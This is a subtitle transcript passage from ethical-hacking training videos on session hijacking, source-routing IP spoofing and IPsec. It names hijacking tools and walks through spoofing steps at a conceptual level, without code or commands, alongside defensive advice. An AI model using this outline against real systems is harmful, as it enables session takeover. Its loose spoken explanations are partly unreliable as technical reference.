at\n\n906\n00:38:39.932 --> 00:38:40.820\nITProTV.\n\n907\n00:38:40.820 --> 00:38:43.060\nThe workshop behind the scenes,\nyou would not believe.\n\n908\n00:38:43.060 --> 00:38:44.179\nIt looks like a human cloning factory.\n\n909\n00:38:44.179 --> 00:38:45.960\n&gt;&gt; [LAUGH]\n&gt;&gt; It's just unbelievable.\n\n910\n00:38:45.960 --> 00:38:49.790\nSo we could do reset hijacking, and we\ncan obviously use that as part 2 of this.\n\n911\n00:38:49.790 --> 00:38:51.618\nIf we did that,\nwe would bump the victim off.\n\n912\n00:38:51.618 --> 00:38:54.383\nThen we would come in and\nre-establish that session.\n\n913\n00:38:54.383 --> 00:38:56.641\nEssentially, take over,\nwhich would be kinda cool.\n\n914\n00:38:56.641 --> 00:38:59.321\nWe've talked about things\nlike blind hijacking before.\n\n915\n00:38:59.321 --> 00:39:02.747\nWe could go in and inject malicious\ndata or commands into the intercepted\n\n916\n00:39:02.747 --> 00:39:05.285\ncommunications, attempting\nto try to get it right.\n\n917\n00:39:05.285 --> 00:39:07.380\nAnd obviously, if we can,\nwe could take that over.\n\n918\n00:39:07.380 --> 00:39:09.170\nSo that would be something to consider.\n\n919\n00:39:09.170 --> 00:39:11.920\nWe talked about man-in-the-middle\nattacks and how they work.\n\n920\n00:39:11.920 --> 00:39:13.960\nWe could do forward ICMP and ARP spoofing.\n\n921\n00:39:13.960 --> 00:39:19.190\nYou've seen me demonstrate these before\nin other episodes and in other areas.\n\n922\n00:39:19.190 --> 00:39:22.970\nWe can go in, and once we sniff\nthe packet traffic and figure it out,\n\n923\n00:39:22.970 --> 00:39:24.960\ninject that information.\n\n924\n00:39:24.960 --> 00:39:26.810\nWe could do UDP hijacking.\n\n925\n00:39:26.810 --> 00:39:28.180\nWe can essentially just go in and\n\n926\n00:39:28.180 --> 00:39:31.990\nmanipulate another protocol at the same\nlayer, and be able to do that.\n\n927\n00:39:31.990 --> 00:39:36.070\nWe, instead of TCP, focus on UDP, and\nessentially, it comes out the same way.\n\n928\n00:39:36.070 --> 00:39:38.677\nRemember that a lot of\ntraffic is TCP-based, but\n\n929\n00:39:38.677 --> 00:39:41.170\na lot of traffic is UDP-based and\na lot is both.\n\n930\n00:39:41.170 --> 00:39:44.489\nWe have to understand, potentially,\nthat that is the case as well.\n\n931\n00:39:44.489 --> 00:39:47.352\nI mentioned that we would give\nyou some session hijacking tools,\n\n932\n00:39:47.352 --> 00:39:48.351\nas we always try to do.\n\n933\n00:39:48.351 --> 00:39:51.180\nShowed you and talked about the zap\nproxy so, obviously that's a good one.\n\n934\n00:39:51.180 --> 00:39:52.234\nYou want to be aware of that.\n\n935\n00:39:52.234 --> 00:39:58.550\nA popular one that's out there, burp\nsuite is one that you often hear about.\n\n936\n00:39:58.550 --> 00:40:00.820\nA lot of people use.\n\n937\n00:40:00.820 --> 00:40:04.600\nJ Hijack, I was gonna say JH Hijack,\nbut J Hijack.\n\n938\n00:40:04.600 --> 00:40:07.000\nThat's a Java hide hacking tool,\nit's kinda cool for\n\n939\n00:40:07.000 --> 00:40:10.580\nweb app sessions with\nregards to the Java machine.\n\n940\n00:40:10.580 --> 00:40:11.940\nSo it maybe a cool one.\n\n941\n00:40:11.940 --> 00:40:15.600\nWe're [INAUDIBLE] cookie monster,\ncookie cadger, is one that's kinda cool.\n\n942\n00:40:15.600 --> 00:40:18.160\nThat's c-a-d-g-e-r, cadger, cadger.\n\n943\n00:40:18.160 --> 00:40:21.710\nI'm not sure how you pronounce that but\nCookie Catcher maybe so\n\n944\n00:40:21.710 --> 00:40:25.150\nCookie Catcher, fire sheets\nare a popular one that's around for\n\n945\n00:40:25.150 --> 00:40:26.960\na few years back it was all the rage.\n\n946\n00:40:26.960 --> 00:40:30.500\nEverybody was using it to put the plug\nins in the browser and do that.\n\n947\n00:40:30.500 --> 00:40:32.910\nThere's something called cookie catcher,\nthere's tamper ie,\n\n948\n00:40:32.910 --> 00:40:35.490\nthere's all these different\nones which are kind of cool.\n\n949\n00:40:35.490 --> 00:40:40.450\nSSL strip is one that you\ncan use on Cali Linux for\n\n950\n00:40:40.450 --> 00:40:43.660\nLinux based boxes to execute attacks.\n\n951\n00:40:43.660 --> 00:40:45.200\nSo that might be a good one.\n\n952\n00:40:45.200 --> 00:40:48.560\nFor the mobile platform, we talked about\nsome of these in the mobile episodes,\n\n953\n00:40:48.560 --> 00:40:51.490\nDroid Sheep, I think we mentioned,\nmay have mentioned Droid sniff.\n\n954\n00:40:51.490 --> 00:40:52.100\nI don't remember,\n\n955\n00:40:52.100 --> 00:40:56.910\nbut some of those will be Android-based\nsystem tools that you can use.\n\n956\n00:40:56.910 --> 00:40:59.540\nKeep in mind that from\na countermeasure perspective,\n\n957\n00:40:59.540 --> 00:41:01.040\nwe've talked a lot about this.\n\n958\n00:41:01.040 --> 00:41:04.790\nThe more we pay attention to, the more\nwe monitor, the more we tighten up,\n\n959\n00:41:04.790 --> 00:41:06.280\nthe more we're gonna find.\n\n960\n00:41:06.280 --> 00:41:08.640\nAnd the biggest defenses\nwe can put in place here,\n\n961\n00:41:08.640 --> 00:41:12.190\nas we've said, single-use session IDs,\nsession timeouts.\n\n962\n00:41:12.190 --> 00:41:14.990\nYou just tightly monitoring\nthose things to ensure\n\n963\n00:41:14.990 --> 00:41:18.670\nthat would not allowing\nthe hacker to get in.\n\n964\n00:41:18.670 --> 00:41:22.670\nAnd run a mocking kind of take over\ncontrol what we're not paying attention.\n\n965\n00:41:22.670 --> 00:41:27.115\nThe use of session, excuse me the use\nUse of IPS and IDS systems, both inward\n\n966\n00:41:27.115 --> 00:41:30.565\nlooking and outward looking are gonna\nalso play a very important part here.\n\n967\n00:41:30.565 --> 00:41:32.385\nSecured communication pathways, so\n\n968\n00:41:32.385 --> 00:41:37.550\nusing SSH and encrypted protocols as\nopposed to open transmit protocols.\n\n969\n00:41:37.550 --> 00:41:40.860\nMake sure that we are implementing\nlog out functionality and\n\n970\n00:41:40.860 --> 00:41:42.670\ntime outs as we mentioned.\n\n971\n00:41:42.670 --> 00:41:47.160\nMake sure that what else am I thinking of?\n\n972\n00:41:47.160 --> 00:41:48.660\nProbably not transporting the session.\n\n973\n00:41:48.660 --> 00:41:52.060\nID inquiry strings would be a good\nprotection mechanism there.\n\n974\n00:41:52.060 --> 00:41:53.550\nOWASP been the top ten list, and\n\n975\n00:41:53.550 --> 00:41:57.440\ntalks about some of that with insecure\nInformation, and the code that's embedded.\n\n976\n00:41:57.440 --> 00:41:59.010\nRight so we don't wanna do that.\n\n977\n00:41:59.010 --> 00:42:02.690\nUsing switched rather than hubs although\nhubs are not really used much today.\n\n978\n00:42:02.690 --> 00:42:03.810\nWe talked about that.\n\n979\n00:42:03.810 --> 00:42:05.470\nSo that's just something to consider.\n\n980\n00:42:05.470 --> 00:42:07.370\nBut probably encrypted protocols and\n\n981\n00:42:07.370 --> 00:42:09.820\nthe things we talked about are gonna\nbe the most important things,\n\n982\n00:42:09.820 --> 00:42:13.650\nand also get your web developers some\ntraining on how to write secure code.\n\n983\n00:42:13.650 --> 00:42:15.590\nBecause that's also\ngonna be very important.\n\n984\n00:42:15.590 --> 00:42:18.540\nA lot of times this stuff happens\nbecause the web developers\n\n985\n00:42:18.540 --> 00:42:21.530\nare not adding the proper\nsecurity controls into the code.\n\n986\n00:42:21.530 --> 00:42:23.080\nAnd that could be an issue.\n\n987\n00:42:23.080 --> 00:42:25.760\nAlso train your end users, right.\n\n988\n00:42:25.760 --> 00:42:28.110\nWeb users that are the victim ultimately,\n\n989\n00:42:28.110 --> 00:42:31.200\nhave to be trained to made aware of\nthe fact that there may be suspicious tell\n\n990\n00:42:31.200 --> 00:42:33.570\ntale signs of behavior\nthat they wanna look for.\n\n991\n00:42:33.570 --> 00:42:36.040\nThey should run firewalls in\nthe local endpoints, right.\n\n992\n00:42:36.040 --> 00:42:37.890\nSo they should have a firewall\nthat's always running.\n\n993\n00:42:37.890 --> 00:42:40.810\nThey should only use browsers\nthat are up to date and approved.\n\n994\n00:42:40.810 --> 00:42:44.470\nAnd you should have a base line for\nsystems and managing those systems.\n\n995\n00:42:44.470 --> 00:42:46.250\nYou should be on top of\npatch management and\n\n996\n00:42:46.250 --> 00:42:49.210\nmake sure that everything's patched and\nup to date, and things like that.\n\n997\n00:42:49.210 --> 00:42:52.720\nGet users some training with regards to\nphishing and awareness around phishing.\n\n998\n00:42:52.720 --> 00:42:55.360\nWe talked about this a little\nbit in the malware episodes.\n\n999\n00:42:55.360 --> 00:42:58.240\nTalked about it in the social\nengineering episodes, right.\n\n1000\n00:42:58.240 --> 00:43:02.460\nThe idea that if we allow users to click\non any link that you can guarantee that\n\n1001\n00:43:02.460 --> 00:43:05.340\neventually they're gonna get phished,\nand something bad is gonna happen.\n\n1002\n00:43:05.340 --> 00:43:07.560\nSo we wanna make sure we're\naware of all these kinda things.\n\n1003\n00:43:07.560 --> 00:43:10.950\nThese are gonna be general broad\ncountermeasures that help us to deal\n\n1004\n00:43:10.950 --> 00:43:13.810\nwith the attack portion or\nthe session hijacking.\n\n1005\n00:43:13.810 --> 00:43:15.930\nIf we can stop it from happening,\n\n1006\n00:43:15.930 --> 00:43:18.300\nthen we obviously are gonna\nbe in a much recession.\n\n1007\n00:43:18.300 --> 00:43:21.960\nI'd much rather find evidence to the fact\nto try it to my logs after the fact.\n\n1008\n00:43:21.960 --> 00:43:25.660\nBut also find evidence that you were not\nsuccessful because users didn't actually\n\n1009\n00:43:25.660 --> 00:43:26.480\ntake the bait.\n\n1010\n00:43:26.480 --> 00:43:28.810\nThat's gonna be the best outcome right.\n\n1011\n00:43:28.810 --> 00:43:31.610\n&gt;&gt; All right very good great\nlook there session hijacking.\n\n1012\n00:43:31.610 --> 00:43:35.590\nGot to see a little demonstration\nthat zed attack proxy there.\n\n1013\n00:43:35.590 --> 00:43:36.340\n&gt;&gt; Zap attack proxy.\n\n1014\n00:43:36.340 --> 00:43:38.660\n&gt;&gt; Sorry zap attack proxy with.\n\n1015\n00:43:38.660 --> 00:43:43.960\nTalked about client side or cross site\nscripting, and the forgery requests.\n\n1016\n00:43:43.960 --> 00:43:46.880\nSo lot of great information there\nas we round out or conversion.\n\n1017\n00:43:46.880 --> 00:43:47.670\n&gt;&gt; Ooh, can we do one other thing?\n\n1018\n00:43:47.670 --> 00:43:49.323\n&gt;&gt; Absolutely.\n&gt;&gt; [INAUDIBLE] One other\n\n1019\n00:43:49.323 --> 00:43:50.130\nthing, so-\n&gt;&gt; Bring it back.\n\n1020\n00:43:50.130 --> 00:43:52.286\n&gt;&gt; That wasn't the one thing, but\nthank you very much, I appreciate that.\n\n1021\n00:43:52.286 --> 00:43:54.010\n&gt;&gt; [LAUGH]\n&gt;&gt; The one thing was, I had asked you, and\n\n1022\n00:43:54.010 --> 00:43:56.600\nI know you did create that\nlittle issue in solution table.\n\n1023\n00:43:56.600 --> 00:43:57.460\nI just wanted to quickly-\n&gt;&gt; Yes.\n\n1024\n00:43:57.460 --> 00:43:58.950\n&gt;&gt; Since we were talking about\ncountermeasures, I forgot,\n\n1025\n00:43:58.950 --> 00:44:00.840\nI just wanted to mention that real quick,\nand throw that up.\n\n1026\n00:44:00.840 --> 00:44:03.960\nSo if we can go to Mike's machine as\nsoon as he's ready just one more thing.\n\n1027\n00:44:03.960 --> 00:44:06.990\nWe did have that so\nwe put together a little table for you.\n\n1028\n00:44:06.990 --> 00:44:10.330\nWe're just summarizing some of the issues\nwith things that are not secure and\n\n1029\n00:44:10.330 --> 00:44:11.560\nsolutions associated with them.\n\n1030\n00:44:11.560 --> 00:44:15.870\nI mentioned most of these use SSH,\nuse secure protocols right.\n\n1031\n00:44:15.870 --> 00:44:19.520\nMake sure you apply things\nlike IP sec to the IP Traffic.\n\n1032\n00:44:19.520 --> 00:44:23.040\nMake sure you use VPNs to communicate\nsecurely with encryption.\n\n1033\n00:44:23.040 --> 00:44:26.850\nSo just wanted to show us the visually\nthe talking through it just to make sure.\n\n1034\n00:44:26.850 --> 00:44:27.610\n&gt;&gt; Can I put in notes as well?\n\n1035\n00:44:27.610 --> 00:44:28.910\n&gt;&gt; Yeah.\nJust to make sure we kinda had\n\n1036\n00:44:28.910 --> 00:44:31.950\na reference for that and\nthat we are aware of that.\n\n1037\n00:44:31.950 --> 00:44:37.280\nI know we're gonna also,\nin the next episode, come back and\n\n1038\n00:44:37.280 --> 00:44:40.210\ntalk a bit about IPSec and just make\nsure that we understand how that works.\n\n1039\n00:44:40.210 --> 00:44:43.060\nGot a couple of cool diagrams\nthat you put together.\n\n1040\n00:44:43.060 --> 00:44:45.650\nWe mention it up there with regards to IP.\n\n1041\n00:44:45.650 --> 00:44:46.720\nSo stay tuned for that one.\n\n1042\n00:44:46.720 --> 00:44:48.750\nCome back as that's gonna be\nan important conversation.\n\n1043\n00:44:48.750 --> 00:44:50.950\nTo round out our session\nhijacking discussion.\n\n1044\n00:44:50.950 --> 00:44:51.930\n&gt;&gt; Very good all right,\n\n1045\n00:44:51.930 --> 00:44:54.270\nwell you heard it from the man\nhimself we do have more to come.\n\n1046\n00:44:54.270 --> 00:44:56.680\nSo hope you guys enjoyed\nwatching this one.\n\n1047\n00:44:56.680 --> 00:44:59.410\nSigning off for\nIT Pro TV I'm Mike Roderick.\n\n1048\n00:44:59.410 --> 00:45:00.230\n&gt;&gt; I am Adam Gordon.\n\n1049\n00:45:00.230 --> 00:45:03.785\n&gt;&gt; And we'll see you next time.\n\n1050\n00:45:03.785 --> 00:45:10.140\n[SOUND]\n\n",

host,\n\n3\n00:00:16.052 --> 00:00:19.444\nMike Rodrick, and today we're doing\nour certified ethical hacker,\n\n4\n00:00:19.444 --> 00:00:21.280\nI think version nine.\n\n5\n00:00:21.280 --> 00:00:24.610\nSpecifically in this episode we're\nactually continuing our conversation on\n\n6\n00:00:24.610 --> 00:00:25.940\nwith session hijacking.\n\n7\n00:00:25.940 --> 00:00:29.500\nWe've got a few more pieces, [NOISE],\nthat we need to talk about and\n\n8\n00:00:29.500 --> 00:00:33.519\nhere to help us as you might have saw\nfrom the preview, is Mr. Adam Gordon.\n\n9\n00:00:33.519 --> 00:00:34.490\nHow you doing Adam?\n\n10\n00:00:34.490 --> 00:00:37.340\n&gt;&gt; Good, can I do like a half\nscreen when I'm kind of this way.\n\n11\n00:00:37.340 --> 00:00:38.360\nLet's see if we can make this work.\n\n12\n00:00:38.360 --> 00:00:39.380\nI can be over here.\n\n13\n00:00:39.380 --> 00:00:40.460\nWhat we need is a mirror, so I can.\n\n14\n00:00:40.460 --> 00:00:42.300\n&gt;&gt; You can switch back and\nforth [INAUDIBLE]\n\n15\n00:00:42.300 --> 00:00:43.421\n&gt;&gt; Can you switch back and\n\n16\n00:00:43.421 --> 00:00:45.196\nno [NOISE] my God, that's so crazy.\n\n17\n00:00:45.196 --> 00:00:46.380\nAll right anyway.\n\n18\n00:00:47.420 --> 00:00:50.530\nWe're gonna continue\nwith session hijacking.\n\n19\n00:00:50.530 --> 00:00:53.980\nWe left off at the end\nof the last episode, and\n\n20\n00:00:53.980 --> 00:00:55.890\nI just wanted to come\nback to a point we made.\n\n21\n00:00:55.890 --> 00:00:59.230\nWe were talking about source routing\nexploits, and I kind of described it,\n\n22\n00:00:59.230 --> 00:01:01.270\nI walked through the concept,\nbut we actually,\n\n23\n00:01:01.270 --> 00:01:04.390\ntotally my fault by the way,\ncuz Mike was prepared to have the list up.\n\n24\n00:01:04.390 --> 00:01:06.550\nI forgot to ask him to do it, but\n\n25\n00:01:06.550 --> 00:01:09.285\nwe had a little list we put together for\nyou as we often do of the steps, and\n\n26\n00:01:09.285 --> 00:01:12.600\nI just thought it would be great to just\ngo back and make sure you can see that.\n\n27\n00:01:12.600 --> 00:01:14.970\nWe'll include it in the notes,\nobviously so you have it.\n\n28\n00:01:14.970 --> 00:01:16.380\nBut its good just to walk through it, so\n\n29\n00:01:16.380 --> 00:01:20.270\nin case your familiar at a high level of\nthe concept, but maybe you don't really\n\n30\n00:01:20.270 --> 00:01:24.930\nunderstand it when we talk about it,\nthis will help you to envision it.\n\n31\n00:01:24.930 --> 00:01:27.900\nMaestro if you please, if we can go to,\nthere we go, outstanding.\n\n32\n00:01:27.900 --> 00:01:29.510\nLook at that, that teamwork.\n\n33\n00:01:29.510 --> 00:01:30.030\n&gt;&gt; I like it.\n\n34\n00:01:30.030 --> 00:01:33.650\n&gt;&gt; A well oiled machine here at ITProTV,\nfolks, let me tell you what.\n\n35\n00:01:33.650 --> 00:01:36.280\nAll right, so step one,\nstep two, step three.\n\n36\n00:01:36.280 --> 00:01:39.555\nI think there's even a step forward five\nsomewhere down there we'll get to those.\n\n37\n00:01:39.555 --> 00:01:43.065\nHow do we do IP spoofing\nwith source routed packets?\n\n38\n00:01:43.065 --> 00:01:47.145\nThe idea here as I described we're just\nreviewing it before we go on and continue.\n\n39\n00:01:47.145 --> 00:01:50.150\nWe're gonna be moving into IPSEC\nhere in a couple of minutes\n\n40\n00:01:50.150 --> 00:01:51.150\njust to give you a sense.\n\n41\n00:01:51.150 --> 00:01:53.900\nStep one, packet source routing\ntechnique is used, right?\n\n42\n00:01:53.900 --> 00:01:54.540\nWe go ahead and\n\n43\n00:01:54.540 --> 00:01:58.380\nwe gain unauthorized access to a computer\nwith the help of the host IP address,\n\n44\n00:01:58.380 --> 00:02:02.770\nmeaning we have to have physical control\nof the box to be able to do this, right?\n\n45\n00:02:02.770 --> 00:02:07.090\nWe're gonna go in through the trusted\nhost IP and gained control in some way or\n\n46\n00:02:07.090 --> 00:02:08.520\nunauthorized access to it.\n\n47\n00:02:08.520 --> 00:02:11.940\nCuz remember we're gonna send traffic,\nbut we're gonna make the decision as\n\n48\n00:02:11.940 --> 00:02:16.590\nthe originator to manipulate the routing\nflow and hard code the path or\n\n49\n00:02:16.590 --> 00:02:20.950\nhard code information on the pack instead\nof leaving it up to a dynamic routing\n\n50\n00:02:20.950 --> 00:02:25.972\nsolution or just generically routers to be\nable to propagate and tell us where to go.\n\n51\n00:02:25.972 --> 00:02:29.380\nStep two, the attacker spoofs the host's\nIP address so that the server managing\n\n52\n00:02:29.380 --> 00:02:32.460\nthe session with the host,\naccepts packets from the attacker.\n\n53\n00:02:32.460 --> 00:02:34.900\nWe become that IP in other words, right?\n\n54\n00:02:34.900 --> 00:02:37.390\nYou now take control of the session, but\n\n55\n00:02:37.390 --> 00:02:40.930\nwe have to get control of the original\nmachine, the target first,\n\n56\n00:02:40.930 --> 00:02:43.081\nto now be able to spoof and\nthen they can go take them out.\n\n57\n00:02:43.081 --> 00:02:45.390\nStep three when the session\nis established,\n\n58\n00:02:45.390 --> 00:02:47.490\nthe attacker now offs right the bad actor,\n\n59\n00:02:47.490 --> 00:02:51.230\nwe inject the forged packets before\nthe host responds to the server.\n\n60\n00:02:51.230 --> 00:02:53.275\nThe original packet from the host is lost,\n\n61\n00:02:53.275 --> 00:02:56.735\ncuz the server gets the pack with\nthe sequence number already in use,\n\n62\n00:02:56.735 --> 00:03:00.585\nthey discard the original,\ndon't realize it, switch to us.\n\n63\n00:03:00.585 --> 00:03:01.325\nYou're Mike.\nNo you're not.\n\n64\n00:03:01.325 --> 00:03:02.115\nYou're Mike, right?\n\n65\n00:03:02.115 --> 00:03:03.235\nAnd now we're talking to you.\n\n66\n00:03:03.235 --> 00:03:06.275\nNow I've got control of the routing path,\nand I now control and\n\n67\n00:03:06.275 --> 00:03:07.705\nmanipulate the flow of data.\n\n68\n00:03:07.705 --> 00:03:10.800\nAnd in step five, the packets from\nthe attacker are source routed through\n\n69\n00:03:10.800 --> 00:03:14.220\nthe host with the destination IP\nnow controlled and specified by us.\n\n70\n00:03:14.220 --> 00:03:16.560\n&gt;&gt; Wow, nice.\n&gt;&gt; A little sleight of hand there.\n\n71\n00:03:16.560 --> 00:03:18.030\nThat's how we actually execute that.\n\n72\n00:03:18.030 --> 00:03:21.160\nIf you wanted to see the steps\ninvolved just so you know,\n\n73\n00:03:21.160 --> 00:03:24.400\nI believe since we're here we can stay on\nhere cuz we're gonna talk about IPSEC and\n\n74\n00:03:24.400 --> 00:03:25.672\nthe components of IPSEC.\n\n75\n00:03:25.672 --> 00:03:30.300\nLet's switch discussion topic points here\nfor a couple of minutes or talking points.\n\n76\n00:03:30.300 --> 00:03:33.380\nWe talk a lot about IPSEC,\nwe've mentioned it, IPSEC short for\n\n77\n00:03:33.380 --> 00:03:34.640\nIP security by the way.\n\n78\n00:03:34.640 --> 00:03:38.830\nWe've mentioned it in several of our\nconversations, not just in CEH but\n\n79\n00:03:38.830 --> 00:03:45.410\nin many of the other shows Cloud,\n\n80\n00:03:45.410 --> 00:03:50.490\nthe CCSD security classes, in CASP I\nknow we've talked about it there.\n\n81\n00:03:50.490 --> 00:03:55.480\nThis is the general idea of how we\nare going to use the IPSEC drive or\n\n82\n00:03:55.480 --> 00:04:00.070\nthe other associated parts that we see\nhere to do protocol level encryption and\n\n83\n00:04:00.070 --> 00:04:04.252\ndecryption of packets, right, in the OSI\nmodel down in the networking layers.\n\n84\n00:04:04.252 --> 00:04:08.720\nWe're gonna be able to apply the\nprotection necessary to make sure these\n\n85\n00:04:08.720 --> 00:04:12.980\ntraffic exchanges are going to be not\ncompromised, but rather encrypted and\n\n86\n00:04:12.980 --> 00:04:15.882\ntherefore confidentiality is gonna\nbe a plot in there protected and\n\n87\n00:04:15.882 --> 00:04:18.278\nthis is a pretty standard way\nof doing things today right.\n\n88\n00:04:18.278 --> 00:04:21.860\nL2TP with IPSEC for\ninstance layer two tunneling, and\n\n89\n00:04:21.860 --> 00:04:25.325\nall the same model by applying\nan IPSEC at that level.\n\n90\n00:04:25.325 --> 00:04:29.040\nWe're gonna then bind then be able to\nhave the tunnel but also the application\n\n91\n00:04:29.040 --> 00:04:32.510\nof the encryption associated with it,\nand authentication by the way, as well.\n\n92\n00:04:32.510 --> 00:04:35.340\n&gt;&gt; Yeah, I think one of the great things\nabout IPSEC is the fact that it's\n\n93\n00:04:35.340 --> 00:04:36.830\nreally application independent.\n\n94\n00:04:36.830 --> 00:04:41.780\nBecause it's done so low on the OSI model,\nthe applications don't have to be\n\n95\n00:04:41.780 --> 00:04:45.260\naware of it, therefore it's\nrelatively easy to implement, even\n\n96\n00:04:45.260 --> 00:04:49.080\nthe applications that don't understand how\nto encrypt and how to do this or that.\n\n97\n00:04:49.080 --> 00:04:51.260\nIt is application independent,\nabsolutely correct.\n\n98\n00:04:51.260 --> 00:04:55.460\nAs long as we can operate it layer two and\nlayer three of the OSI model to manipulate\n\n99\n00:04:55.460 --> 00:05:00.860\nthe packet if we're doing an L2TP IT set\nsolution along with the IPSEC drivers and\n\n100\n00:05:00.860 --> 00:05:03.210\nthe components to generate\nthe security associations,\n\n101\n00:05:03.210 --> 00:05:04.430\nthings we're gonna go through.\n\n102\n00:05:04.430 --> 00:05:07.290\nYou could be using any applications,\nthey run on top of it so\n\n103\n00:05:07.290 --> 00:05:08.210\nit really doesn't matter.\n\n104\n00:05:08.210 --> 00:05:11.040\nIt's a network related as opposed\nto application related concern, so\n\n105\n00:05:11.040 --> 00:05:12.810\nit's a very good point to make,\nright, because that way-\n\n106\n00:05:12.810 --> 00:05:15.400\n&gt;&gt; Unlike HTTPS where the browser has to\n\n107\n00:05:15.400 --> 00:05:17.360\nunderstand how to encrypt this stuff.\n\n108\n00:05:17.360 --> 00:05:20.770\n&gt;&gt; Absolutely, as a result to just\nreally drive your point home,\n\n109\n00:05:20.770 --> 00:05:24.240\nand it's again a really important and\nreally great point that Mike is making.\n\n110\n00:05:24.240 --> 00:05:27.550\nThe idea here is that because\nwe're application independent,\n\n111\n00:05:27.550 --> 00:05:31.450\nwe don't need to have applications that\nare necessarily encryption capable or\n\n112\n00:05:31.450 --> 00:05:32.750\nencryption aware, right?\n\n113\n00:05:32.750 --> 00:05:35.470\nWe can apply this separate\nfrom the application.\n\n114\n00:05:35.470 --> 00:05:39.670\nNotepad, which is not an encryption aware,\nencryption capable application\n\n115\n00:05:39.670 --> 00:05:43.840\ncan safely be used to send data through an\nencrypted tunnel because it doesn't have\n\n116\n00:05:43.840 --> 00:05:46.000\nto have knowledge of the fact\nthat the tunnel exists.\n\n117\n00:05:46.000 --> 00:05:49.490\nAnd it's a very important point\nas I've said now I think three\n\n118\n00:05:49.490 --> 00:05:53.790\ntimes [LAUGH] that Mike has made, but I'm\nstressing it for a very specific reason.\n\n119\n00:05:53.790 --> 00:05:55.550\nIt's a great observation number one, but\n\n120\n00:05:55.550 --> 00:05:58.570\nnumber two\n&gt;&gt; It's a critical thought process for\n\n121\n00:05:58.570 --> 00:06:02.560\nus as a security professional to\nbe aware of because we can split\n\n122\n00:06:02.560 --> 00:06:07.100\nthe awareness of the implementation of the\nsecurity controls from the application,\n\n123\n00:06:07.100 --> 00:06:10.980\nand use the applications irrespective\nof whether they support it or not.\n\n124\n00:06:10.980 --> 00:06:15.570\nAnd we can now focus security at that\nlower level and be really just focused on\n\n125\n00:06:15.570 --> 00:06:20.430\nconfiguration and management of it, and\nin addition, we also wanna remember and\n\n126\n00:06:20.430 --> 00:06:25.150\nkeep in mind that we do use an application\ninterface in order to manage IPSEC, right?\n\n127\n00:06:25.150 --> 00:06:26.890\nThat is important to consider.\n\n128\n00:06:26.890 --> 00:06:30.435\nBut having said that,\nwe're not actually going\n\n129\n00:06:30.435 --> 00:06:35.197\nto need an application that is IPSEC\naware to be able to use IPSEC.\n\n130\n00:06:35.197 --> 00:06:37.954\nIt is just something else to think about,\nyou'll just keep in mind about and\n\n131\n00:06:37.954 --> 00:06:41.490\nyou'll just keep in mind as we're talking,\nit's definitely a good observation.\n\n132\n00:06:41.490 --> 00:06:43.890\nWith regards to the IPSEC driver,\n\n133\n00:06:43.890 --> 00:06:47.930\nyou can see there that we're gonna\nbe able to have the IPSEC driver.\n\n134\n00:06:47.930 --> 00:06:52.280\nIt's just really the overall set up for\nthe encryption and decryption.\n\n135\n00:06:52.280 --> 00:06:55.778\nAside from that, we're gonna have IKE,\nthe Internet Key Exchange.\n\n136\n00:06:55.778 --> 00:06:59.405\nAnd IKE is the protocol that\nproduces security keys for IPSEC and\n\n137\n00:06:59.405 --> 00:07:00.227\nother protocols.\n\n138\n00:07:00.227 --> 00:07:03.695\nWe're gonna see that coming up in our\ndiagrams that you put together for us.\n\n139\n00:07:03.695 --> 00:07:06.285\nWe have, and I love to say it,\nISAKMP, right?\n\n140\n00:07:06.285 --> 00:07:10.232\nInternet Security Association Key\nManagement Protocol, I-S-A-K-M-P,\n\n141\n00:07:10.232 --> 00:07:13.942\nthis is gonna allow two\ncomputers to communicate through\n\n142\n00:07:13.942 --> 00:07:15.907\nencryption of data exchanged between them.\n\n143\n00:07:15.907 --> 00:07:20.312\nAnd we're gonna used what it's called SAs,\nSecurity Associations that are centrally\n\n144\n00:07:20.312 --> 00:07:23.572\nthe by product of this communication\nis the ability or not,\n\n145\n00:07:23.572 --> 00:07:28.232\nI shouldn't say the by product of it,\nthe necessary element that is in place\n\n146\n00:07:28.232 --> 00:07:33.280\nbefore we then ultimately do this is the\nnegotiation of this two one way agreements\n\n147\n00:07:33.280 --> 00:07:37.960\nto be able to communicate securely and\nessentially agree to what the rules of\n\n148\n00:07:37.960 --> 00:07:42.490\nan exchange, and therefore, communication\nwill be we represent these as the SAs, and\n\n149\n00:07:42.490 --> 00:07:45.160\nISAKMP is used to be able\nto drive that process.\n\n150\n00:07:45.160 --> 00:07:46.927\nAnd then Oakley which is a protocol,\n\n151\n00:07:46.927 --> 00:07:50.575\nanother protocol, not a sun glass\nmanufacturer, although they are both.\n\n152\n00:07:50.575 --> 00:07:52.412\nProtocol which uses Diffie-Hellman,\n\n153\n00:07:52.412 --> 00:07:55.600\nwe talk about Diffie-Hellman in\nthe cryptography conversations and\n\n154\n00:07:55.600 --> 00:07:59.011\nthose segments you obviously want to\nwatch those episodes if you have not.\n\n155\n00:07:59.011 --> 00:08:02.971\nThis is an algorithm that's\nused to do Key exchanges.\n\n156\n00:08:02.971 --> 00:08:05.516\nSo we're gonna use that to be able\nto use or rather have the ability\n\n157\n00:08:05.516 --> 00:08:08.420\nto create the keys that are used\nto ultimately do the encryption.\n\n158\n00:08:08.420 --> 00:08:13.540\nAnd to create the keys that control\nthe session specific IPsec data transfer.\n\n159\n00:08:13.540 --> 00:08:16.510\nSo we just wanna have a sense\nof the moving parts, right.\n\n160\n00:08:16.510 --> 00:08:19.778\nNow I know we have a set of\nimages that we put together and\n\n161\n00:08:19.778 --> 00:08:22.987\nthat you are going to be able\nto show us and there we go.\n\n162\n00:08:22.987 --> 00:08:27.890\nAnd so the first one is gonna be able\nto lay out the high level force of how\n\n163\n00:08:27.890 --> 00:08:32.410\nIPsec is set up, and ultimately,\nwhat is going to happen.\n\n164\n00:08:32.410 --> 00:08:35.450\nIf you don't mind, I'm gonna actually\neither ask you to zoom in, or I'm gonna\n\n165\n00:08:35.450 --> 00:08:38.540\nask you to narrate, cuz I know you can see\nit better than I can, one or the other.\n\n166\n00:08:38.540 --> 00:08:40.500\nBut from where I'm standing, I can't see.\n\n167\n00:08:40.500 --> 00:08:43.520\nI know what we put in the boxes, but\nI just can't see which is which.\n\n168\n00:08:43.520 --> 00:08:44.360\nBut if we zoomed out,\n\n169\n00:08:44.360 --> 00:08:46.380\nyeah, there we go, if we do that,\nthen it's much easier to see.\n\n170\n00:08:46.380 --> 00:08:50.360\nAll right, so in step 1, right, and\nactually, zoom back out for just a second.\n\n171\n00:08:50.360 --> 00:08:52.930\nLet's make sure everybody can see\nthe thought process, all right?\n\n172\n00:08:52.930 --> 00:08:55.276\nSo and we'll talk about\nthe steps here in a second, but\n\n173\n00:08:55.276 --> 00:08:57.893\nlet's 